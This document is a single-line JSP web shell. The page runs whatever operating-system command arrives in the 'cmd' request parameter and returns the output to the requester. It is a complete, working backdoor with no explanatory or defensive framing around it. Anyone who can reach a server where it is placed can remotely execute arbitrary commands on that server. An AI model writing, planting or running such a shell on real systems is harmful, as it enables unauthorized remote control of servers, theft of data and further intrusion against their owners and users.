<%@ page import="java.io.*" %><%=new String(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream().readAllBytes())%>
